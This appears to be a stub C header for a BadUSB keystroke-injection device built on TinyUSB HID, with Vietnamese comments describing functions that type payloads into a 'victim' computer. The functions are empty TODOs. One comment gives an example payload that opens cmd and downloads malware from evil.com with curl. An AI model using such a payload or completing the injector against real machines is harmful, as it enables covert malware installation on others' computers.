#ifndef BADUSB_H
#define BADUSB_H

#include <stdint.h>
#include <stdbool.h>

// Khởi tạo thư viện giả lập bàn phím USB (TinyUSB HID)
void badusb_init() {
    // TODO: Init TinyUSB Device (tud_init)
    // Board_init()
}

// Hàm đẩy chuỗi phím vào máy tính nạn nhân
void badusb_inject_payload(const char* payload) {
    // Vd Payload: "GUI r\ncmd\ncurl -O http://evil.com/malware.exe\n"
    // TODO: Dịch chuỗi ASCII sang chuẩn HID Keycode.
    // Gọi hàm tud_hid_keyboard_report() để "gõ" phím.
}

// Nhiệm vụ (Task) giữ kết nối USB luôn sống
void badusb_task() {
    // tud_task(); // Yêu cầu gọi liên tục trong main loop
}

#endif // BADUSB_H
